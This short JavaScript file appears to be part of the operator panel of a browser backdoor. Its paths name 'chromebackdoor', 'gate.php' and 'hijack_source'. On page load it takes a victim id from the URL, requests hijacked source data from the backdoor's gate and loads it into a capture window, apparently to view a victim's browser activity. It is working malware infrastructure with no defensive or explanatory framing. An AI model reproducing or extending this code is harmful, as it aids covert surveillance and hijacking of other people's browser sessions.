$(document).ready(function(){
var urlef  = window.location.href;
    if(urlef.split('id=')[1] != undefined){
        $.get('http://localhost:8888/taff/private/chromebackdoor/web/gate.php?hijack_source=1&id='+urlef.split('id=')[1], function(data)
        {
            $('.captureWindow')[0].src = data;
        });
    }
});
